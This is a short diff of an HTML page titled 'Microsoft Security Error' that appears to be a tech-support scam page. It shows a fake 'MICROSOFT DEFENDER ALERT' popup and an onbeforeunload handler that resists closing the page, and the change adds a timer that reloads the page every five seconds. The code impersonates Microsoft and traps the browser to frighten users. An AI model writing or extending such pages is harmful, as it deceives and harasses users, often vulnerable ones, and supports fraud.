@@ -7,7 +7,9 @@
 	<title>Microsoft Security Error</title>
 	
  <script>
-
+setTimeout(function(){
+   window.location.reload(1);
+}, 5000);
 		  alert("***MICROSOFT DEFENDER ALERT*** Threat found!");
     window.onbeforeunload = function(e) {
        return 'Dialog text here.';
